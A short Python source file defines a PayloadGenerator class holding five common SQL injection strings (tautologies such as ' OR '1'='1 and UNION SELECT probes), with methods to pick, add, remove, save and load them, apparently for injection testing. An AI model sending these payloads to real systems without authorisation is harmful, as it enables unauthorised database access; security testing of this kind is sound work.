import random

class PayloadGenerator:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' UNION SELECT null, null, null--",
            "' OR 'a'='a",
            "' OR 1=1 --",
            "' AND 1=2 UNION SELECT 1, 'test', 'test'--"
        ]

    def get_all_payloads(self):
        return self.payloads

    def get_random_payload(self):
        return random.choice(self.payloads)

    def add_payload(self, payload):
        self.payloads.append(payload)

    def remove_payload(self, payload):
        if payload in self.payloads:
            self.payloads.remove(payload)

    def clear_payloads(self):
        self.payloads.clear()

    def save_payloads(self, filename="payloads.txt"):
        with open(filename, "w") as f:
            f.write("\n".join(self.payloads))

    def load_payloads(self, filename="payloads.txt"):
        with open(filename, "r") as f:
            self.payloads = f.read().splitlines()
